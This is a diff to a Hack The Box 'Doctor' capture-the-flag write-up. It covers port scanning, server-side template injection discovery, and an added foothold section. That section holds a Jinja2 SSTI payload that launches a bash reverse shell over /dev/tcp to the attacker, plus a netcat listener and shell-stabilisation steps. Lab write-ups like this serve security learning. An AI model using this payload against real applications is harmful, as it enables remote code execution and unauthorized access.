@@ -1,7 +1,7 @@
 # Hack the box
 ## Doctor writeup
 
-### Enumeartion / Initial Recon
+### Enumeartion / Recon
 
 + nmap port scan - ```nmap -sC -sV -oN nmap.txt 10.10.10.209```
 ```bash
@@ -49,5 +49,29 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + Testing multiple Server Side Template Injection from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
 + **SUCCESS** We have successful SSTI
 ![image](https://github.com/brownPineapple/hackthebox/assets/30342446/7da4af12-c81a-428f-81bd-7caedaf941ff)
+
+### Initial Foothold
+
++ Checking for reverse shell payloads on PayloadAllTheThings SSTI -
++ The one that worked was - ```{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/<ip>/4444 0>&1'").read()}}{%endif%}{%endfor%}```
++ Starting netcat listener - ```nc -lvnp 4444``` and getting reverse shell as web@doctor
+![image](https://github.com/brownPineapple/hackthebox/assets/30342446/2e42813a-dcba-415b-bdbf-b15d7951a808)
++ ```/home``` directory has another user shaun with user.txt file
++ We are part of the admin group, we can check audit logs for passwords
+  ```bash
+  id
+  uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+  ```
+
+### Lateral movement
+
++ To get user we need access to shaun user
++ Making the shell stable
+  1. run this command ```python3 -c 'import pty;pty.spawn("/bin/bash")'``` on victim machine
+  2. if the above doesn't work try - ```script -qc /bin/bash /dev/null```
+  3. Do **ctrl+z** to background the process
+  4. On your host machine in the same session do ```stty raw -echo;fg``` + Enter + Enter
+  5. Now you have a stable shell
+![image](https://github.com/brownPineapple/hackthebox/assets/30342446/69c9d560-27e9-415b-9dfb-890b9f950dd6)
 
 
